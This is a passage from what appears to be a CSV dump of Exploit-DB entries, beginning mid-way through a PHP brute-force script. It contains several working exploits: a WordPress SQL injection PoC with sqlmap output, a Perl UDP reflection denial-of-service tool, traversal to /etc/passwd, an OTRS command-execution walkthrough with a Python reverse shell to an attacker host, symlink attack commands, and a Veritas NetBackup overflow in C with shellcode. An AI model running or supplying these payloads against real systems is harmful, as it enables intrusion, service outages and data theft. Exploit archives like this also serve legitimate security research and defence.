help_argc($argv[0]); 	exit(0); } else { 	$ARG = array();  	foreach ($argv as $arg) {  		if (strpos($arg, '-') === 0) {  			$key = substr($arg,1,1); 			if (!isset($ARG[$key])) $ARG[$key] = substr($arg,3,strlen($arg));  		}  	}  	if ($ARG[s] && $ARG[u]) 	{ 		$server = $ARG[s]; 		$User_id = intval($ARG[u]); 		$User_id--;  		print ""[+] Phase 1 brute login.\n""; 		$login = brute($User_id,""Login""); 		print ""\n[+] Phase 1 successfully finished: $login\n"";  		print ""[+] Phase 2 brute password-hash.\n""; 		$hash = brute($User_id,""Password""); 		print ""\n[+] Phase 2 successfully finished: $hash\n"";  		successfully($login,$hash); 	} 	else 	{ 		help_argc($argv[0]); 		exit(0); 	}  }  ?>   # milw0rm.com [2008-12-23]",remote,webapps,1
36777,"WordPress Plugin Ajax Store Locator 1.2 - SQL Injection ######################  # Exploit Title : Wordpress Ajax Store Locator <= 1.2 SQL Injection Vulnerability  # Exploit Author : Claudio Viviani  # Vendor Homepage : http://codecanyon.net/item/ajax-store-locator-wordpress/5293356  # Software Link : Premium  # Dork Google: inurl:ajax-store-locator #              index of ajax-store-locator        # Date : 2015-03-29  # Tested on : Windows 7 / Mozilla Firefox #             Linux / Mozilla Firefox  ######################  # Info:   The ""sl_dal_searchlocation_cbf"" ajax function is affected from SQL Injection vulnerability    ""StoreLocation"" var is not sanitized  # PoC Exploit:   http://TARGET/wordpress/wp-admin/admin-ajax.php?action=sl_dal_searchlocation&funMethod=SearchStore&Location=Social&StoreLocation=1~1 AND (SELECT * FROM (SELECT(SLEEP(10)))LCKZ)    StoreLocation's value must contain ""~"" delimiter    $storeLoc = $_REQUEST[""StoreLocation""];  ...  ...  $qryVal = explode(""~"", $storeLoc);  $sql_query = ""SELECT a.*,b.*, 0 as ......... LEFT JOIN `$sl_tb_pluginset` as b ON (1=1)  WHERE a.id=$qryVal[1]""  # PoC sqlmap:   sqlmap -u ""http://TARGET/wordpress/wp-admin/admin-ajax.php?action=sl_dal_searchlocation&funMethod=SearchStore&Location=Social&StoreLocation=1~1"" -p StoreLocation --dbms mysql   [18:24:11] [INFO] GET parameter 'StoreLocation' seems to be 'MySQL >= 5.0.12 AND time-based blind (SELECT)' injectable   for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n]   [18:24:18] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'  [18:24:18] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found  [18:24:24] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'  [18:24:29] [INFO] checking if the injection point on GET parameter 'StoreLocation' is a false positive  GET parameter 'StoreLocation' is vulnerable. Do you want to keep testing the others (if any)? [y/N]   sqlmap identified the following injection points with a total of 89 HTTP(s) requests:  ---  Parameter: StoreLocation (GET)      Type: AND/OR time-based blind      Title: MySQL >= 5.0.12 AND time-based blind (SELECT)      Payload: action=sl_dal_searchlocation&funMethod=SearchStore&Location=Social&StoreLocation=1~1 AND (SELECT * FROM (SELECT(SLEEP(5)))LCKZ)  ---  [18:29:48] [INFO] the back-end DBMS is MySQL  web server operating system: Linux CentOS 5.10  web application technology: PHP 5.3.3, Apache 2.2.3  back-end DBMS: MySQL 5.0.12      #####################  Discovered By : Claudio Viviani                 http://www.homelab.it                 http://adf.ly/1F1MNw (Full HomelabIT Archive Exploit) 				http://ffhd.homelab.it (Free Fuzzy Hashes Database) 				                 info@homelab.it                 homelabit@protonmail.ch                  https://www.facebook.com/homelabit                 https://twitter.com/homelabit                 https://plus.google.com/+HomelabIt1/                 https://www.youtube.com/channel/UCqqmSdMqf_exicCe_DjlBww  #####################",remote,webapps,1
37669,"Counter-Strike 1.6 - 'GameInfo' Query Reflection Denial of Service (PoC) #!/usr/bin/perl # #  Counter-Strike 1.6 'GameInfo' Query Reflection DoS #  Proof Of Concept # #  Copyright 2015 (c) Todor Donev  #  todor.donev@gmail.com #  http://www.ethical-hacker.org/ #  https://www.facebook.com/ethicalhackerorg #  http://pastebin.com/u/hackerscommunity  # # #  Disclaimer: #  This or previous program is for Educational #  purpose ONLY. Do not use it without permission. #  The usual disclaimer applies, especially the #  fact that Todor Donev is not liable for any #  damages caused by direct or indirect use of the #  information or functionality provided by these #  programs. The author or any Internet provider #  bears NO responsibility for content or misuse #  of these programs or any derivatives thereof. #  By using these programs you accept the fact #  that any damage (dataloss, system crash, #  system compromise, etc.) caused by the use #  of these programs is not Todor Donev's #  responsibility. # #  Use at your own risk and educational  #  purpose ONLY! # #  See also, UDP-based Amplification Attacks: #  https://www.us-cert.gov/ncas/alerts/TA14-017A # #  # perl cstrike-drdos-poc.pl 46.165.194.16 192.168.1.10 27010 #  [ Counter-Strike 1.6 'GameInfo' query reflection dos poc #  [ Sending GameInfo requests: 46.165.194.16 -> 192.168.1.10   #  ^C # #  # tcpdump -i eth0 -c4 port 27010 #  tcpdump: verbose output suppressed, use -v or -vv for full protocol decode #  listening on eth0, link-type EN10MB (Ethernet), capture size 65535 bytes #  00:00:00.000000 IP 192.168.1.10.31337 > masterserver.css.setti.info.27010: UDP, length 25 #  00:00:00.000000 IP masterserver.css.setti.info.27010 > 192.168.1.10.31337: UDP, length 1392 #  00:00:00.000000 IP 192.168.1.10.31337 > masterserver.css.setti.info.27010: UDP, length 25 #  00:00:00.000000 IP masterserver.css.setti.info.27010 > 192.168.1.10.31337: UDP, length 1392 #  4 packets captured #  4 packets received by filter #  0 packets dropped by kernel   use strict; use Socket; use warnings; no warnings 'uninitialized';  print ""[ Counter-Strike 1.6 \'GameInfo\' query reflection dos poc\n""; die ""[ Sorry, must be run as root. This script use RAW Socket.\n"" if ($< != 0); my $css         = (gethostbyname($ARGV[0]))[4];         # IP Address Destination        (32 bits) my $victim      = (gethostbyname($ARGV[1]))[4];         # IP Address Source             (32 bits) my $port        = $ARGV[2] || '27015';                  # Int between 1 and 65535        Default: 27015 die ""[ Port must be between 1 and 65535!\n"" if ($port < 1 || $port > 65535); if (!defined $css || !defined $victim) {     print ""[ Usg: $0 <cstrike server> <victim> <port>\n"";     print ""[ Default port: 27015\n"";     print ""[ <todor.donev\@gmail.com> Todor Donev\n"";     exit; }  print ""[ Sending GameInfo requests: $ARGV[0] -> $ARGV[1]\n""; socket(RAW, AF_INET, SOCK_RAW, 255)             || die $!; setsockopt(RAW, 0, 1, 1)                        || die $!; main();      # Main program sub main {     my $packet;          $packet = iphdr();     $packet .= udphdr();     $packet .= cshdr();     # b000000m...     send_packet($packet); }      # IP header (Layer 3) sub iphdr {     my $ip_ver         	= 4;                                    # IP Version 4                  (4 bits)     my $iphdr_len      	= 5;                                    # IP Header Length              (4 bits)     my $ip_tos         	= 0;                                    # Differentiated Services       (8 bits)     my $ip_total_len   	= $iphdr_len + 20;                      # IP Header Length + Data      (16 bits)     my $ip_frag_id     	= 0;                                    # Identification Field         (16 bits)     my $ip_frag_flag   	= 000;                                  # IP Frag Flags (R DF MF)       (3 bits)     my $ip_frag_offset 	= 0000000000000;                        # IP Fragment Offset           (13 bits)     my $ip_ttl         	= 255;                                  # IP TTL                        (8 bits)     my $ip_proto       	= 17;                                   # IP Protocol                   (8 bits)     my $ip_checksum    	= 0;                                    # IP Checksum                  (16 bits)      # IP Packet 	my $iphdr       = pack(                         'H2 H2 n n B16 h2 c n a4 a4',                         $ip_ver . $iphdr_len, $ip_tos,                          $ip_total_len, $ip_frag_id,                          $ip_frag_flag . $ip_frag_offset,                         $ip_ttl, $ip_proto, $ip_checksum,                         $victim, $css                         );                         return $iphdr; }      # UDP Header (Layer 4) sub udphdr {     my $udp_src_port	= 31337;                        # UDP Sort Port         (16 bits) (0-65535)     my $udp_dst_port	= $port;                        # UDP Dest Port         (16 btis) (0-65535)     my $udp_len		= 8 + length(cshdr());          # UDP Length            (16 bits) (0-65535)     my $udp_checksum 	= 0;                            # UDP Checksum          (16 bits) (XOR of header)      # UDP Packet     my $udphdr		= pack( 			'n n n n', 			$udp_src_port,  			$udp_dst_port, 			$udp_len,  			$udp_checksum 			); 	return $udphdr; }     # Counter-Strike 'GameInfo' request  sub cshdr {  # # https://developer.valvesoftware.com/wiki/Server_queries # # https://developer.valvesoftware.com/wiki/Source_RCON_Protocol # Requests # The server responds to 5 queries: # #          A2S_INFO   'T' (0x54)  #    Basic information about the server.  #          A2S_PLAYER 'U' (0x55)   #    Details about each player on the server.  #          A2S_RULES  'V' (0x56)  #    The rules the server is using.  #          A2A_PING   'i' (0x69) #    Ping the server. (DEPRECATED)  # A2S_SERVERQUERY_GETCHALLENGE  'W' (0x57) #    Returns a challenge number for use in the player and rules query. (DEPRECATED)  # # Queries should be sent in UDP packets to the listen port of the server.  #   # 25 bytes - A2S_INFO     my $query            = ""\xff\xff\xff\xff\x54"";      # 0000   ff ff ff ff 54 53 6f 75 72 63 65 20 45 6e 67 69  ....TSource Engi        $query           .= ""\x53\x6f\x75\x72\x63"";      # 0010   6e 65 20 51 75 65 72 79 00                       ne Query.        $query           .= ""\x65\x20\x45\x6e\x67"";	        $query           .= ""\x69\x6e\x65\x20\x51"";	        $query           .= ""\x75\x65\x72\x79\x00"";	      my $cshdr            = pack('a*', $query); return $cshdr; }  sub send_packet {     while(1){     select(undef, undef, undef, 0.40);                  # Sleep 400 milliseconds     send(RAW, $_[0], 0, pack('Sna4x8', AF_INET, 60, $css))  || die $!;    } }",local,dos,0
27586,PHPMyForum 4.0 - 'index.php?type' CRLF Injection source: https://www.securityfocus.com/bid/17420/info   phpMyForum is prone to multiple cross-site scripting vulnerabilities. These issues are due to a failure in the application to properly sanitize user-supplied input.    An attacker may leverage these issues to have arbitrary script code executed in the browser of an unsuspecting user in the context of the affected site. This may help the attacker steal cookie-based authentication credentials and launch other attacks.   phpMyForum 4.0 is reported prone to these issues. Other versions may be affected as well.  http://target/path/index.php?template=css&type=some_url%0d%0aSet-Cookie%3Aheader,remote,webapps,1
5217,"ICQ Toolbar 2.3 - ActiveX Remote Denial of Service <!-- 	Lame ICQToolbar IE DoS - Crash IE and change toolbar color :p -->  <html> <object classid='clsid:855F3B16-6D32-4FE6-8A56-BBB695989046' id='toolbar' ></object>  <script language='vbscript'> bof=String(128, ""spdr"") toolbar.GetPropertyById """" ,bof  </script> </html>  # milw0rm.com [2008-03-06]",remote,dos,1
27107,PHPXplorer 0.9.33 - 'action.php' Directory Traversal source: https://www.securityfocus.com/bid/16292/info  phpXplorer is prone to a directory traversal vulnerability. This issue is due to a failure in the application to properly sanitize user-supplied input.  An attacker can exploit this vulnerability to retrieve arbitrary files from the vulnerable system in the context of the Web server process. Information obtained may aid in further attacks; other attacks are also possible.  Version 0.9.33 is vulnerable; other versions may also be affected.   http://www.example.com/folder/system/action.php?sShare=guest&sAction= ../../../../../../../../../../../../etc/passwd%00  http://www.example.com/phpXplorer/system/action.php?sShare=guest&sAction= ../../../../../../../../../../../../etc/passwd%00  http://www.example.com/phpXplorer/system/action.php?sShare=guest&sAction= ../../../../../../../../../../../../etc/passwd%00,remote,webapps,1
9276,"Joomla! Component IXXO Cart! Standalone and - SQL Injection Original advisory at: http://www.davidsopas.com/2009/07/25/ixxo-cart-standalone-and-joomla-component-sql-injection/  Ref. [DSF-03-2009] â€“ IXXO Cart! Standalone and Joomla Component SQL Injection Vendor: IXXO Internet Solutions Status: Patched by vendor  IXXO Cart! IXXO Cart is an extremely powerful php shopping cart and web site builder application. Designed from a marketing perspective, this ecommerce application is feature-packed, robust, scalable and easy to use. IXXO Cart Plus is the clear choice for serious merchants focused on rapidly and cost effectively deploying, managing and growing a successful web-based business. New users appreciate the easy-to-use tools designed to help set up their store quickly and effectively while experienced users love the ability to customize and manage our software to meet the needs of their growing business.  Description This very known PHP store is vulnerable to SQL Injection on â€œparentâ€ variable. Injecting a specific combination of SQL commands will execute the new SQL query and even provide sensitive database information that could help a malicious user to complete and enter a valid SQL injection query.  Proof of concept parent=1%27)%20order%20by%203/*  Impact A malicious user could manipulate SQL queries by injecting arbitrary SQL code and return private information.  Time-line June 2, 2009 â€“ First contact by contact form June 17, 2009 â€“ Second contact by email June 17, 2009 â€“ Reply from vendor June 18, 2009 â€“ Vendor reported that only standalone version and Joomla 1.0.x component are vulnerable June 24, 2009 â€“ Vendor asked for more time to patch and warn their clients about this vulnerability June 25, 2009 â€“ Vendor released 3.9.6.1 and and updated demo versions on their site July 20, 2009 â€“ Third contact to check the status July 25, 2009 â€“ Advisory goes public  Disclosed Not yet published in any database  # milw0rm.com [2009-07-27]",remote,webapps,1
3273,"HP Tru64 Alpha OSF1 5.1 - 'ps' Information Leak #!/bin/ksh # # osf1tru64ps.ksh exploit # Tested on OSF1 V5.1 1885 alpha # # ps executable - information leak #  # Author: Andrea ""bunker"" Purificato #         http://rawlab.mindcreations.com # # the ""ps"" command (also /usr/ucb/ps) on HP OSF1 v5.1 Alpha, # developed without an eye to security, allows unprivileged users to see # values of all processes environment variables. # # Useful during information discovery. # # fake_uname> uname -a            # OSF1 fake_uname V5.1 1885 alpha #  # fake_uname> id # uid=301(fake_user) gid=216(fake_gid) # # fake_uname> /usr/ucb/ps auxeww  # USER            PID %CPU %MEM   VSZ  RSS TTY      S    STARTED         TIME COMMAND # ... # ... # root        1038875  0.0  0.0 2.02M 184K ??       I    11:39:03     0:00.01 sleep 55 MANPATH=/usr/share/man:/usr/dt/share/man:/usr/local/man:/usr/opt/networker/man:/usr/local/openssh/bin PATH=/sbin:/bin:/usr/bin:/usr/sbin:/sbin:/bin:/usr/bin:/usr/sbin:/sbin:/usr/sbin:/usr/bin:/usr/ccs/bin:/usr/bin/X11:/usr/local:/usr/local/openssh/bin:/usr/opt/networker/bin LOGNAME=root USER=root SHELL=/bin/ksh HOME=/ TERM=vt100 PWD=/opt/AmosLite_Client... # ... # ... # root        1009950  0.0  0.0 2.73M 840K ??       I <    Sep 30     0:31.22 /usr/sbin/auditd -l /LOG_SOURCE/audit/auditlog HOME=/ LOGNAME=root MANPATH=/usr/share/man:/usr/dt/share/man:/usr/local/man:/usr/opt/networker/man:/usr/local/openssh/bin PATH=/sbin:/usr/sbin:/usr/bin:/usr/ccs/bin:/usr/bin/X11:/usr/local:/usr/local/openssh/bin:/usr/opt/networker/bin PWD=/var/audit SHELL=/bin/ksh TERM=xterm USER=root... # ... # ... # oracle       541177  0.0  0.0 28.2M 3.4M ??       S      Sep 01     0:07.00 /app/oracle/product/9.2.0/Apache/Apache/bin/httpd -d /app/oracle/product/9.2.0/Apache/Apache HOME=/app/oracle LD_LIBRARY_PATH=/app/oracle/product/9.2.0/lib:/app/oracle/product/9.2.0/lib:/app/oracle/product/9.2.0/obackup/lib: LOGNAME=oracle NLS_LANG=AMERICAN_AMERICA.WE8MSWIN1252 OBK_HOME=/app/oracle/product/9.2.0/obackup ORACLE_BACKUP=/app/oracle/BACKUP ORACLE_BASE=/app/oracle ORACLE_DOC=/app/oracle/product/9.2.0/oradoc ORACLE_HOME=/app/oracle/product/9.2.0 ORACLE_PATH=/app/oracle/product/9.2.0/oracle ORACLE_SID=... # ... # ... # echo ""Tru64 Alpha OSF1 V5.1 1885  - ps information leak"" echo ""Andrea \""bunker\"" Purificato - http://rawlab.mindcreations.com"" echo """" echo ""Default ps executable: "" ps auxewww  echo ""/usr/ucb/ps executable: "" /usr/ucb/ps auxewww  # milw0rm.com [2007-02-06]",local,local,1
43853,"OTRS 5.0.x/6.0.x - Remote Command Execution # Exploit Title: OTRS Shell Access  # Date: 21-01-2018 # Exploit Author: Bæln0rn # Vendor Homepage: https://www.otrs.com/ # Software Link: http://ftp.otrs.org/pub/otrs/ # Version: 4.0.1 - 4.0.26, 5.0.0 - 5.0.24, 6.0.0 - 6.0.1 # Tested on: OTRS 5.0.2/CentOS 7.2.1511 # CVE : CVE-2017-16921  CVE-2017-16921:  ""In OTRS 6.0.x up to and including 6.0.1, OTRS 5.0.x up to and including 5.0.24, and OTRS 4.0.x up to and including 4.0.26, an attacker who is logged into OTRS as an agent can manipulate form parameters (related to PGP) and execute arbitrary shell commands with the permissions of the OTRS or web server user.""  OTRS 5.0.2 PoC: 1. Authenticate to an agent account. <path>/index.pl  2. Open ""Admin"" tab. <path>/index.pl?Action=Admin  3. Open ""SysConfig"" link. <path>/index.pl?Action=AdminSysConfig  4. Find the ""Crypt:PGP"" subgroup. <path>/index.pl?Action=AdminSysConfig;Subaction=Edit;SysConfigSubGroup=Crypt%3A%3APGP;SysConfigGroup=Framework  5. Manipulate form parameters and use ""Update"" button to save:  ""PGP"" -Default: No -New: Yes  ""PGP::Bin"" -Default: /usr/bin/gpg  -New: <shell command including executables the webserver user has execute permissions for, no options> -PoC (Reverse Python Shell): /usr/bin/python  ""PGP::Options"" -Default: --homedir /opt/otrs/.gnupg/ --batch --no-tty --yes -New: <any command options> -PoC (Reverse Python Shell): -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""<YOURIP>"",<YOURLISTENINGPORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",""-i""]);'  6. Open ""Admin"" tab. <path>/index.pl?Action=Admin  7. Open ""PGP Keys"" to execute saved command.  <path>/index.pl?Action=AdminPGP  Behavior will vary based on commands. The above PoC opened a stable, no TTY, reverse shell under the ""apache"" user. The page eventually timed out with a 502 error, but the web application seems otherwise unaffected.  Killing the shell before timeout advances the web application to the proper ""PGP Management"" page. The exploit can be repeated unlimited times with step #7 above.",remote,webapps,1
8067,"Enomaly ECP / Enomalism < 2.2.1 - Multiple Local Vulnerabilities Enomaly ECP/Enomalism: Multiple vulnerabilities in enomalism2.sh (redux)  Synopsis  All versions of Enomaly ECP/Enomalism[1] before 2.2.1 have multiple issues relating to the use of temporary files in an insecure manner.  Fixes for CVE-2008-4990[2] and CVE-2009-0390[3] in 2.1.1 and 2.2 were found to be ineffective.  Background  Enomaly ECP (formerly Enomalism) is management software for virtual machines.  Description  Sam Johnston[4] of Australian Online Solutions[5] reported multiple vulnerabilities in enomalism2.sh:  - Race condition on $PIDFILE renders 2.1.1 fixes ineffective  - Incomplete fixes in 2.1.1/2.2 fail to address stop/restart functions  - Root ownership check (ls -l $PIDFILE |grep root) is trivially bypassed by:    - changing the symlink's group to one containing the word 'root' or    - creating a symlink to any filename containing the word 'root'  - Process check (ps -p $PID |grep enomalism2d) is also trivially bypassed.  Impact  A local attacker could perform a symlink attack to overwrite arbitrary files on the system with root privileges, inject arguments to the 'kill' command to terminate or send arbitrary signals to any process(es) as root or launch a denial of service attack by preventing the virtual machines from starting.  Exploits  a. while true; do ln -s /etc/passwd /tmp/enomalism2.pid; done b. echo ""-9 1"" > /tmp/enomalism2.pid c. i. ln -s /tmp/root /tmp/enomalism2.pid   ii. chgrp beetroot /tmp/enomalism2.pid  Workaround  Change PIDFILE from /tmp/enomalism2.pid to /var/run/enomalism2.pid  Resolution  All Enomaly ECP and Enomalism users should upgrade to version 2.2.1[6] which includes researcher fix.  History  2009-02-09 Bug initially reported to Enomaly by mail 2009-02-09 CVE(s) requested from Mitre; TBA 2009-02-09 Product Development Manager acknowledged receipt.   ""Thanks, we're incorporating a fix for the next release."" 2009-02-10 Update announced[7] with no mention of security vulnerability:   ""ECP 2.2.1 is now available on both sourceforge and pypi.  This is a   bug-fix release.  No new features have been added."" 2009-02-14 Publication of vulnerability  References 1. http://sourceforge.net/projects/enomalism 2. http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2008-4990 3. http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2009-0390 4. http://samj.net/ 5. http://www.aos.net.au/ 6. http://sourceforge.net/project/showfiles.php?group_id=164855&package_id=186866&release_id=660061 7. http://groups.google.com/group/enomalism/browse_thread/thread/ae94ac7cb5fa7683  # milw0rm.com [2009-02-16]",local,local,1
1421,"Veritas NetBackup 4/5 - Volume Manager Daemon Remote Buffer Overflow /*  	DESCRIPTION  	Veritas NetBackup Stack Overflow (tcp/13701) 	""Volume Manager Daemon"" Module  	Advisories 	http://www.idefense.com/intelligence/vulnerabilities/display.php?id=336 	http://www.frsirt.com/english/advisories/2005/2349  	USAGE  	C:\NetBackup>nb 192.168.0.2 4444 192.168.0.200 0 	Veritas NetBackup v4/v5 ""Volume Manager Daemon"" Stack Overflow. 	Sending first buffer. 	Sending second buffer.  	C:\NetBackup>nc 192.168.0.200 4444 	Microsoft Windows 2000 [versie 5.00.2195] 	(C) Copyright 1985-2000 Microsoft Corp.  	C:\WINNT\system32>  	INFORMATION  	I wrote this just for educational purposes :).  	Because the buffer is only very small, I had to write small shellcode. 	The code is less than 100 bytes, and there are 6 bytes left. So there 	is still space to improve it. The stack seems to be static, every run 	at the exact same location.  	I used the Import Address Table (that looks like this):  	(taken from v5.1) 	Import Address Table 	00447230 (send) 	00447234 (recv) 	00447238 (accept) 	00447240 (listen) 	0044724C (connect) 	00447268 (closesocket) 	00447284 (bind) 	00447288 (socket)  	Using that shellcode I retrieve the ""second"" shellcode. This can be ANY 	code, and ANY size. No limitations.  	Tested on Windows 2000 Professional, Service Pack 4, Dutch. 	Tested on Veritas NetBackup 4.5, 5.0, 5.1 with some Maintenance Packs. 	(not all).  	Enjoy.  */ #include <winsock2.h> #include <stdio.h> #pragma comment(lib,""ws2_32"")  DWORD WINAPI SendShellcode(LPVOID lpParam); int iLocalOpenPort;  /* win32_bind -  EXITFUNC=seh LPORT=4444 Size=344 Encoder=PexFnstenvSub http://metasploit.com */ char szShellcode[] = 	""\x2b\xc9\x83\xe9\xb0\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xd2"" 	""\x4a\xe7\xed\x83\xeb\xfc\xe2\xf4\x2e\x20\x0c\xa0\x3a\xb3\x18\x12"" 	""\x2d\x2a\x6c\x81\xf6\x6e\x6c\xa8\xee\xc1\x9b\xe8\xaa\x4b\x08\x66"" 	""\x9d\x52\x6c\xb2\xf2\x4b\x0c\xa4\x59\x7e\x6c\xec\x3c\x7b\x27\x74"" 	""\x7e\xce\x27\x99\xd5\x8b\x2d\xe0\xd3\x88\x0c\x19\xe9\x1e\xc3\xc5"" 	""\xa7\xaf\x6c\xb2\xf6\x4b\x0c\x8b\x59\x46\xac\x66\x8d\x56\xe6\x06"" 	""\xd1\x66\x6c\x64\xbe\x6e\xfb\x8c\x11\x7b\x3c\x89\x59\x09\xd7\x66"" 	""\x92\x46\x6c\x9d\xce\xe7\x6c\xad\xda\x14\x8f\x63\x9c\x44\x0b\xbd"" 	""\x2d\x9c\x81\xbe\xb4\x22\xd4\xdf\xba\x3d\x94\xdf\x8d\x1e\x18\x3d"" 	""\xba\x81\x0a\x11\xe9\x1a\x18\x3b\x8d\xc3\x02\x8b\x53\xa7\xef\xef"" 	""\x87\x20\xe5\x12\x02\x22\x3e\xe4\x27\xe7\xb0\x12\x04\x19\xb4\xbe"" 	""\x81\x19\xa4\xbe\x91\x19\x18\x3d\xb4\x22\xf6\xb1\xb4\x19\x6e\x0c"" 	""\x47\x22\x43\xf7\xa2\x8d\xb0\x12\x04\x20\xf7\xbc\x87\xb5\x37\x85"" 	""\x76\xe7\xc9\x04\x85\xb5\x31\xbe\x87\xb5\x37\x85\x37\x03\x61\xa4"" 	""\x85\xb5\x31\xbd\x86\x1e\xb2\x12\x02\xd9\x8f\x0a\xab\x8c\x9e\xba"" 	""\x2d\x9c\xb2\x12\x02\x2c\x8d\x89\xb4\x22\x84\x80\x5b\xaf\x8d\xbd"" 	""\x8b\x63\x2b\x64\x35\x20\xa3\x64\x30\x7b\x27\x1e\x78\xb4\xa5\xc0"" 	""\x2c\x08\xcb\x7e\x5f\x30\xdf\x46\x79\xe1\x8f\x9f\x2c\xf9\xf1\x12"" 	""\xa7\x0e\x18\x3b\x89\x1d\xb5\xbc\x83\x1b\x8d\xec\x83\x1b\xb2\xbc"" 	""\x2d\x9a\x8f\x40\x0b\x4f\x29\xbe\x2d\x9c\x8d\x12\x2d\x7d\x18\x3d"" 	""\x59\x1d\x1b\x6e\x16\x2e\x18\x3b\x80\xb5\x37\x85\x22\xc0\xe3\xb2"" 	""\x81\xb5\x31\x12\x02\x4a\xe7\xed"";  char szBuffer[] = 	// We cannot use this small part. 	""a"" 	""AAAAAAAAAAAAAAAAAAAA"" 	""AAAAAAAAAAAAAAAAAAAA"" 	""AAAAAAAAAAAAAAAAAAAA"" 	""AAAAAAAAAAAAAAAAAAA""  	// Since the buffer is so small, we even need a part of 	// the SOCKADDR_IN structure. No problem.  	// struct sockaddr_in { 	""BB""					// sin_family 	""BB""					// sin_port 	""BBBB""					// in_addr 	// ""BBBBBBBB""			// sin_zero 	// }  	// 'START'  	// Move the stackpointer. (0x0012F??? -> 0x0012F000) 	""\xC1\xEC\x0C""			// SHR ESP, 0x0C 	""\xC1\xE4\x0C""			// SHL ESP, 0x0C  	// Call socket(). 	""\x33\xDB""				// XOR EBX, EBX 	""\x53""					// PUSH EBX 	""\x43""					// INC EBX 	""\x53""					// PUSH EBX 	""\x43""					// INC EBX 	""\x53""					// PUSH EBX 	""\xBB\x88\x72\x44\x00""	// MOV EBX, 447288 [socket()] 	""\xFF\x13""				// JMP DWORD PTR [EBX] 	""\x8B\xF8""				// MOV EDI, EAX 	// [edi -> socket]  	// Call connect(). 	""\x33\xDB""				// XOR EBX, EBX 	""\xB3\x16""				// MOV BL, 16 	""\x53""					// PUSH EBX 	""\xBB\x60\xF3\x12\x00""	// MOV EBX, 12F360 	""\x53""					// PUSH EBX 	""\x57""					// PUSH EDI 	""\xBB\x4C\x72\x44\x00""	// MOV EBX, 44724C [connect()] 	""\xFF\x13""				// JMP DWORD PTR [EBX]  	// We need space. 	""\x8B\xD4""				// MOV EDX, ESP 	""\x80\xC6\x01""			// ADD DH, 1  	// Call recv(). 	""\x33\xDB""				// XOR EBX, EBX 	""\x53""					// PUSH EBX 	""\x43""					// INC EBX 	""\xC1\xE3\x10""			// SHL EBX, 8 [1 -> 65536] 	""\x53""					// PUSH EBX 	""\x52""					// PUSH EDX 	""\x57""					// PUSH EDI 	""\xBB\x34\x72\x44\x00""	// MOV EBX, 447234 [recv()] 	""\xFF\x13""				// JMP DWORD PTR [EBX]  	// And again. 	""\x8B\xD4""				// MOV EDX, ESP 	""\x80\xC6\x01""			// ADD DH, 1  	// Jump to our shellcode. 	""\xFF\xE2""				// JMP EDX  	""O"" 	""W"" 	""N"" 	""E"" 	""D"" 	""!""  	""\x68\xF3\x12\x00""		// Here our code starts :). 	""\x00\xF0\x12\x00"";		// Just a random readable address.  // This is the NOT-interesting part :).  DWORD main(int argc, char *argv[]) { 	printf(""Veritas NetBackup v4/v5/v6 \""Volume Manager Daemon\"" Stack Overflow.\n"");  	// We need a local port and ip because our first buffer is way too small 	// to contain our complete shellcode. We use a small shellcode first to 	// retrieve the second shellcode. The only method that fitted as first 	// shellcode was a connect-back shellcode. For the second we got LOADS of 	// space :). 	if (argc<5) { 		printf(""Usage: %s <local ip> <local port> <remote ip> <type>\n\n"", argv[0]); 		printf(""Types (tested):\n""); 		printf("" 0 - NetBackup v5.0_1A\n""); 		printf(""     NetBackup v5.0_2\n""); 		printf(""     NetBackup v5.0_3\n""); 		printf(""     NetBackup v5.1\n\n""); 		return NULL; 	}  	WSADATA wsa; 	WSAStartup(MAKEWORD(2,0), &wsa);  	sockaddr_in strTarget; 	memset(&strTarget, 0, sizeof(strTarget)); 	strTarget.sin_addr.s_addr = inet_addr(argv[3]); 	strTarget.sin_family = AF_INET; 	strTarget.sin_port = htons(13701);  	iLocalOpenPort = atoi(argv[2]); 	HANDLE hStage2 = CreateThread(NULL, 0, SendShellcode, 0, 0, 0);  	SOCKET sTarget = socket(AF_INET, SOCK_STREAM, 0); 	int iResult = connect(sTarget, (struct sockaddr *)&strTarget, sizeof(strTarget));  	if (iResult != SOCKET_ERROR) { 		printf(""Sending first buffer.\n""); 		// Fill in the structure. 		unsigned long family = AF_INET; 		memcpy(szBuffer + 80, &family, 2); 		unsigned long port = htons(iLocalOpenPort); 		memcpy(szBuffer + 82, &port, 2); 		unsigned long ip = inet_addr(argv[1]); 		memcpy(szBuffer + 84, &ip, 4);  		send(sTarget, szBuffer, sizeof(szBuffer)-1, 0); 		closesocket(sTarget); 	}  	WaitForSingleObject(hStage2, 3000); 	WSACleanup(); 	return NULL; }  DWORD WINAPI SendShellcode(LPVOID lpParam) { 	SOCKET sTarget; 	SOCKET sAccept; 	struct hostent *hp; 	struct sockaddr_in strTarget; 	struct sockaddr_in strAccept;  	int iStrSize = sizeof(strTarget);  	memset(&strTarget, 0, sizeof(strTarget)); 	strTarget.sin_addr.s_addr = INADDR_ANY; 	strTarget.sin_family = AF_INET; 	strTarget.sin_port = htons(iLocalOpenPort);  	sTarget = socket(AF_INET, SOCK_STREAM, 0); 	bind(sTarget, (struct sockaddr *)&strTarget, iStrSize); 	listen(sTarget, 2); 	sAccept = accept(sTarget, (struct sockaddr *)&strAccept, &iStrSize);  	if (sAccept != INVALID_SOCKET) { 		printf(""Sending second buffer.\n""); 		send(sAccept, szShellcode, sizeof(szShellcode) - 1, 0); 		closesocket(sAccept); 	}  	return NULL; }  // milw0rm.com [2006-01-16]",remote,remote,1
